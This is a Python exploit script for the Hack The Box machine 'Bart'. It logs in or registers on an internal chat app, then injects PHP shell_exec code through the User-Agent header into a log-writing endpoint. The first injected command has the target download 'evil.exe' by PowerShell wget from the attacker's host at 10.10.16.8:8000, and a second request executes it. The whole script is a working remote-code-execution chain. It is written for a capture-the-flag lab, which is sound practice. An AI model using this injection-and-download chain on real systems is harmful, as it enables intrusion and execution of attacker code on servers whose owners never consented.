#!/usr/bin/env python3
import requests


"""
This script is for Bart on Hackthebox.

It will attempt to login with provided username/password.
If the username/password fails, it an attempt registration.
Then it will attempt to upload and trigger a payload named 'evil.exe'.

Attacker's responsibilities:
    - Craft their own 'evil.exe'
    - Host a web service for 'evil.exe' (python3 -m http.server)
    - Ensure '/etc/hosts' is updated with all necessary hostnames
"""

class Bart:
    def __init__(self):
        self.session = requests.session()
        self.username = "testerson"
        self.password = "testerson"

        self.local_host = "10.10.16.8"
        self.local_port = 8000

        self.exe_file = "evil.exe"

        self.registration_tried = False

    def main(self):
        if not self.login():
            print("[!] Unable to register/login. Stopping.")
            return

        if self.log_tampering():
            print("[+] Payload uploaded and triggered.")


    def log_tampering(self):

        # Download evil.exe
        self.send_payload(
            php_file="basic.php",
            payload=f'powershell "wget http://{self.local_host}:{self.local_port}/{self.exe_file} -OutFile {self.exe_file}',
            description="Basic Payload"
        )

        # Trigger 'exe_file'
        return self.send_payload(
            php_file="evil.php",
            payload=self.exe_file,
            description="Evil Payload"
        )


    def login(self) -> bool:
        login_url = "http://internal-01.bart.htb/simple_chat/login.php"
        data = {"uname": self.username, "passwd": self.password, "submit": "Login"}
        r = self.session.post(login_url, data=data)

        if "<title>[DEV] Internal Chat</title>" not in r.text:
            print("[-] User may not be registered.")
            if self.register() and not self.registration_tried:
                self.registration_tried = True
                return self.login()

            if self.registration_tried:
                print("[!] Something is wrong. Make sure all is well.")

            return False

        print("[+] Login Successful.")
        return True

    def register(self) -> bool:
        registration_url = "http://internal-01.bart.htb/simple_chat/register.php"
        data = {"uname": self.username, "passwd": self.password}

        print("[-] Sending Registration.")

        if self.session.post(registration_url, data=data).status_code == 200:
            print("[-] User is registered.")
            return True

        return False


    def send_payload(self, php_file, payload, description, override=False) -> bool:
        payload_url = f"http://internal-01.bart.htb/log/{php_file}"
        lfi_url = f"http://internal-01.bart.htb/log/log.php?filename={php_file}&username=harvey"
        headers = {"User-Agent": f"<?php shell_exec('{payload}') ?>"}

        if self.session.get(payload_url).status_code == 200 and not override:
            print("[+] Payload already exists on target.")
            return True
        
        print("[-] Attempting to upload the payload.")
        self.session.get(lfi_url, headers=headers)
        if self.session.get(payload_url).status_code == 200:
            print(f"[+] Payload '{description}' uploaded.")
            return True

        print("[!] Payload does not appear uploaded.")
        return False



if __name__ == "__main__":
    b = Bart()
    b.main()
